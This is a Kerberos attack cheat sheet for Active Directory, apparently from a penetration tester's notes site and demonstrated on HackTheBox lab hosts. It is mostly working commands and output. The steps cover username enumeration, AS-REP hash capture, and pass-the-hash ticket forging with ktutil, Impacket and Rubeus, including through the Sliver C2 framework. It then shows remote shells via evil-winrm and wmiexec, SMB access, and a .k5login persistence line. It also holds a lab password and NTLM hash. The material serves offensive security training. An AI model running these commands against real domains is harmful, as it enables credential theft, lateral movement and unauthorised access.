---
title: "Kerberos"
date: 2024-7-2
tags: ["Kerberos", "Pass-The-Ticket", "Hash Cracking", "Rubeus", "Password Cracking", "Sliver", "Enumeration", "Ntlm", "Smb", "Kerbrute", "Pass-The-Hash", "Impacket", "Ticket Granting Ticket", "Domain Controller", "Active Directory", "Windows"]
---

### Usernames enum

{{< tab set1 tab1 >}}kerbrute{{< /tab >}}
{{< tab set1 tab2 >}}metasploit{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
kerbrute userenum --domain <DOMAIN> --dc <DC> <USERNAMES_FILE>
```

```console {class="sample-code"}
$ kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop

2024/09/24 14:54:41 >  Using KDC(s):
2024/09/24 14:54:41 >   dc.absolute.htb:88

2024/09/24 14:54:41 >  [+] VALID USERNAME:       j.roberts@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       m.chaffrey@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       s.osvald@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       d.klay@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       j.robinson@absolute.htb
2024/09/24 14:54:41 >  [+] VALID USERNAME:       n.smith@absolute.htb
2024/09/24 14:54:42 >  Done! Tested 88 usernames (6 valid) in 0.491 seconds
```

<small>*Ref: [kerbrute](https://github.com/ropnop/kerbrute)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
use auxiliary/gather/kerberos_enumusers
```

```console
set user_file <USERNAMES_FILE>
```

```console
set rhosts <DC>
```

```console
set domain <DOMAIN>
```

```console
run
```

```console {class="sample-code"}
msf6 auxiliary(gather/kerberos_enumusers) > run

[*] Using domain: DANTE - 172.16.2.1:88        ...
[*] 172.16.2.1 - User: "user1" user not found
[*] 172.16.2.1 - User: "user2" user not found
[*] 172.16.2.1 - User: "user3" user not found
[+] 172.16.2.1 - User: "user4" does not require preauthentication. Hash: $krb5asrep$23$ ...[SNIP]... 9161d63be1
...[SNIP]...
[*] Auxiliary module execution completed
```

{{< /tabcontent >}}

### Usernames generator

{{< tab set2 tab1 >}}username-anarchy{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
./username-anarchy -i <USERS_FILE> | tee <USERNAMES_FILE>
```

```console {class="sample-code"}
$ username-anarchy -i users.txt | tee usernames.txt
james
jamesroberts
james.roberts
jamesrob
jamerobe
...[SNIP]...
```

<small>*Ref: [username-anarchy](https://github.com/urbanadventurer/username-anarchy)*</small>

{{< /tabcontent >}}

---

### Generate Kerberos ticket (From Linux)

{{< tab set3 tab1 >}}Kinit{{< /tab >}}
{{< tab set3 tab2 >}}Impacket{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 1. Set up

```console
# Step 0: Installation
sudo apt install krb5-user cifs-utils
```

```console
# Step 1: Add domain controller to '/etc/hosts' (Try different order if not work)
<TARGET> <DC> <DOMAIN>
```

```console {class="sample-code"}
10.10.11.181 dc.absolute.htb absolute.htb
```

```console
# Step 2: Add domain controller as a DNS server to '/etc/resolv.conf' [optional]
nameserver <TARGET>
```

```console {class="sample-code"}
nameserver 10.10.11.181
```

```console
# Step 3: Edit '/etc/krb5.conf' (All uppercase)

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

```console {class="sample-code"}
[libdefaults]
    default_realm = ABSOLUTE.HTB

[realms]
    ABSOLUTE.HTB = {
        kdc = DC.ABSOLUTE.HTB:88
        admin_server = DC.ABSOLUTE.HTB
        default_domain = ABSOLUTE.HTB
    }
    
[domain_realm]
    .domain.internal = ABSOLUTE.HTB
    domain.internal = ABSOLUTE.HTB
```

```console
# Step 4: Sync time to domain controller
sudo ntpdate -s <DC>
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.absolute.htb
```

#### 2a. With Password

```console
kinit <USER>
```

```console {class="sample-code"}
$ kinit m.lovegod
Password for m.lovegod@ABSOLUTE.HTB:
```

#### 2b. With NTLM hash

```console
ktutil
```

```console {class="sample-code"}
$ ktutil
ktutil:  
```

```console
add_entry -p <USER>@<DOMAIN> -k 1 -key -e rc4-hmac
```

```console {class="sample-code"}
ktutil:  add_entry -p Administrator@ABSOLUTE.HTB -k 1 -key -e rc4-hmac
Key for Administrator@ABSOLUTE.HTB (hex): 
```

```console
<HASH>
```

```console {class="sample-code"}
Key for Administrator@ABSOLUTE.HTB (hex): 1f4a6093623653f6488d5aa24c75f2ea
ktutil:  
```

```console
write_kt <USER>.keytab
```

```console {class="sample-code"}
ktutil:  write_kt Administrator.keytab
ktutil:  
```

```console
exit
```

```console {class="sample-code"}
ktutil:  exit
```

```console
kinit -V -k -t '<USER>.keytab' -f '<USER>@<DOMAIN>'
```

```console {class="sample-code"}
$ kinit -V -k -t Administrator.keytab -f Administrator@ABSOLUTE.HTB
Using default cache: /tmp/krb5cc_1000
Using principal: Administrator@ABSOLUTE.HTB
Using keytab: Administrator.keytab
Authenticated to Kerberos v5
```

#### 3. Check ticket

```console
klist
```

```console {class="sample-code"}
$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: Administrator@ABSOLUTE.HTB

Valid starting     Expires            Service principal
09/24/24 21:56:09  09/25/24 07:56:09  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
        renew until 09/25/24 21:56:08
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

```console
# With password
sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ sudo ntpdate -s DC.ABSOLUTE.HTB && impacket-getTGT 'ABSOLUTE.HTB/m.lovegod' 
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in m.lovegod.ccache
```

```console
# With hash
sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ sudo ntpdate -s DC.ABSOLUTE.HTB && impacket-getTGT -hashes :1f4a6093623653f6488d5aa24c75f2ea 'ABSOLUTE.HTB/Administrator'
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```

```console
# Import ticket
export KRB5CCNAME='<USER>.ccache'
```

```console {class="sample-code"}
$ export KRB5CCNAME=Administrator.ccache
```

```console
# Check ticket
klist
```

```console {class="sample-code"}
$ klist
Ticket cache: FILE:Administrator.ccache
Default principal: Administrator@ABSOLUTE.HTB

Valid starting     Expires            Service principal
09/24/24 22:20:45  09/25/24 08:20:45  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
        renew until 09/25/24 22:20:45
```

{{< /tabcontent >}}

### Generate Kerberos ticket (From Windows)

{{< tab set4 tab1 >}}rubeus{{< /tab >}}
{{< tabcontent set4 tab1 >}}

```console
# With password
.\rubeus.exe asktgt /user:<USER> /password:'<PASSWORD>' /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> .\rubeus.exe asktgt /user:m.lovegod /password:'AbsoluteLDAP2022!' /enctype:AES256 /domain:ABSOLUTE.HTB /dc:DC.ABSOLUTE.HTB /ptt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
[*] Building AS-REQ (w/ preauth) for: 'ABSOLUTE.HTB\m.lovegod'
[*] Using domain controller: fe80::71ce:9b94:4962:d202%11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFpDCCBa ...[SNIP]... VURS5IVEI=

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/ABSOLUTE.HTB
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  m.lovegod
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  9/24/2024 7:08:14 AM
  EndTime                  :  9/24/2024 11:08:14 AM
  RenewTill                :  9/24/2024 11:08:14 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  u2ScGZUzmFdmTGETruj0VhWSGwiKTg7dbQVabz0QZU8=
  ASREP (key)              :  7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
```

```console
# With hash
.\rubeus.exe asktgt /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> .\rubeus.exe asktgt /user:Administrator /rc4:1f4a6093623653f6488d5aa24c75f2ea /domain:ABSOLUTE.HTB /dc:DC.ABSOLUTE.HTB /ptt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 1f4a6093623653f6488d5aa24c75f2ea
[*] Building AS-REQ (w/ preauth) for: 'ABSOLUTE.HTB\Administrator'
[*] Using domain controller: fe80::71ce:9b94:4962:d202%11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFpDCCBa ...[SNIP]... VURS5IVEI=

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/ABSOLUTE.HTB
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  Administrator
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  9/24/2024 7:10:55 AM
  EndTime                  :  9/24/2024 5:10:55 PM
  RenewTill                :  10/1/2024 7:10:55 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  Ge3n0tM7A0k4q2bJ+0F+uA==
  ASREP (key)              :  1F4A6093623653F6488D5AA24C75F2EA
```

```console
# Check
klist
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> klist

Current LogonId is 0:0x2e0e9d

Cached Tickets: (2)

#0>     Client: Administrator @ ABSOLUTE.HTB
        Server: krbtgt/ABSOLUTE.HTB @ ABSOLUTE.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 9/24/2024 7:10:55 (local)
        End Time:   9/24/2024 17:10:55 (local)
        Renew Time: 10/1/2024 7:10:55 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: Administrator @ ABSOLUTE.HTB
        Server: HTTP/DC.ABSOLUTE.HTB @ ABSOLUTE.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 9/24/2024 7:05:19 (local)
        End Time:   9/24/2024 17:03:25 (local)
        Renew Time: 0
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x8 -> ASC
        Kdc Called:
```

{{< /tabcontent >}}

### Generate Kerberos ticket (From C2)

{{< tab set5 tab1 >}}Sliver{{< /tab >}}
{{< tabcontent set5 tab1 >}}

```console
# With password
rubeus -- 'asktgt /user:<USER> /password:<PASSWORD> /enctype:AES256 /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
```

```console {class="sample-code"}
sliver (helloworld) > rubeus -- 'asktgt /user:m.lovegod /password:AbsoluteLDAP2022! /enctype:AES256 /domain:ABSOLUTE.HTB /dc:DC.ABSOLUTE.HTB /ptt /nowrap'

[*] rubeus output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: Ask TGT

[*] Using salt: ABSOLUTE.HTBm.lovegod
[*] Using aes256_cts_hmac_sha1 hash: 7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
[*] Building AS-REQ (w/ preauth) for: 'ABSOLUTE.HTB\m.lovegod'
[*] Using domain controller: fe80::71ce:9b94:4962:d202%11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFpDCCBa ...[SNIP]... VURS5IVEI=

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/ABSOLUTE.HTB
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  m.lovegod (NT_PRINCIPAL)
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  9/24/2024 7:16:52 AM
  EndTime                  :  9/24/2024 11:16:52 AM
  RenewTill                :  9/24/2024 11:16:52 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  aBhZJr9iogDKSLtohxAgie5HPBSLktIxsRYujp/MqVA=
  ASREP (key)              :  7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
```

```console
# With hash
rubeus -- 'asktgt /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /dc:<DC> /ptt /nowrap'
```

```console {class="sample-code"}
sliver (helloworld) > rubeus -- 'asktgt /user:Administrator /rc4:1f4a6093623653f6488d5aa24c75f2ea /domain:ABSOLUTE.HTB /dc:DC.ABSOLUTE.HTB /ptt /nowrap'

[*] rubeus output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 1f4a6093623653f6488d5aa24c75f2ea
[*] Building AS-REQ (w/ preauth) for: 'ABSOLUTE.HTB\Administrator'
[*] Using domain controller: fe80::71ce:9b94:4962:d202%11:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFpDCCBa ...[SNIP]... VURS5IVEI=
      
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/ABSOLUTE.HTB
  ServiceRealm             :  ABSOLUTE.HTB
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  ABSOLUTE.HTB
  StartTime                :  9/24/2024 7:17:33 AM
  EndTime                  :  9/24/2024 5:17:33 PM
  RenewTill                :  10/1/2024 7:17:33 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  BIdtxt2Rokdo+R9tNjoCLA==
  ASREP (key)              :  1F4A6093623653F6488D5AA24C75F2EA
```

```console
# Check
c2tc-klist
```

```console {class="sample-code"}
sliver (helloworld) > c2tc-klist

[*] Successfully executed c2tc-klist (coff-loader)
[*] Got output:

Cached Tickets: (1)

#0>     Client: Administrator @ ABSOLUTE.HTB
        Server: krbtgt/ABSOLUTE.HTB @ ABSOLUTE.HTB
        KerbTicket Encryption Type: (18) AES256_CTS_HMAC_SHA1_96
        Ticket Flags: 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
        Start Time: 9/24/2024 7:17:33
        End Time:   9/24/2024 17:17:33
        Renew Time: 10/1/2024 7:17:33
        Session Key Type: (23) RC4_HMAC_NT
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

{{< /tabcontent >}}

---

### Winrm with Kerberos

{{< tab set6 tab1 >}}evil-winrm{{< /tab >}}
{{< tab set6 tab2 >}}wmiexec{{< /tab >}}
{{< tabcontent set6 tab1 >}}

```console
# Step 1: Edit '/etc/krb5.conf' (All uppercase)

[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

```console {class="sample-code"}
[libdefaults]
    default_realm = ABSOLUTE.HTB

[realms]
    ABSOLUTE.HTB = {
        kdc = DC.ABSOLUTE.HTB:88
        admin_server = DC.ABSOLUTE.HTB
        default_domain = ABSOLUTE.HTB
    }
    
[domain_realm]
    .domain.internal = ABSOLUTE.HTB
    domain.internal = ABSOLUTE.HTB
```

```console
# Step 2: Connect
sudo ntpdate -s <DC> && evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
```

```console {class="sample-code"}
$ sudo ntpdate -s DC.ABSOLUTE.HTB && evil-winrm -i DC.ABSOLUTE.HTB -r ABSOLUTE.HTB
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

{{< /tabcontent >}}
{{< tabcontent set6 tab2 >}}

```console
sudo ntpdate -s <DC> && impacket-wmiexec '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
```

```console {class="sample-code"}
$ sudo ntpdate -s DC.ABSOLUTE.HTB && impacket-wmiexec 'ABSOLUTE.HTB/Administrator@DC.ABSOLUTE.HTB' -k -no-pass
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

{{< /tabcontent >}}

---

### Connect to SMB with Kerberos

```console
sudo ntpdate -s <DC> && impacket-smbclient '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k -no-pass
```

```console {class="sample-code"}
$ sudo ntpdate -s DC.ABSOLUTE.HTB && impacket-smbclient 'ABSOLUTE.HTB/Administrator@DC.ABSOLUTE.HTB' -k -no-pass
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

Type help for list of commands
# 
```

---

### Add Kerberos Access in Linux

```console
echo "<USER>@<DOMAIN>" > /home/<TARGET_USER>/.k5login
```
